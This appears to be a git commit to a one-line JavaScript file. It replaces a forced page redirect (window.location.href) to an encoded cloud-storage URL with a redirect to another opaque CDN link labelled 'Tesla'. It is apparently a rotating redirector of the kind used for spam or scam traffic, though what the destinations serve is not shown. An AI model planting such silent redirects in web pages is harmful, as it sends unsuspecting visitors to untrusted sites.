6255198707a693b6783a836a9cba9135fa0bc93e
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-02 21:37:45 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,1 @@
-window.location.href='http://s7-static.s3.cn-east-2.jdcloud-oss.com/967?d=cjgua2ZnaHl1ZGUxNzkuY258MTYyNXwveC8xNjI1L2hpOGg='
+window.location.href='https://maobb.cdn.bcebos.com/Tesla?id=NeU27dD3pTrlCsikBYP4vOuaXE9AmJSH'
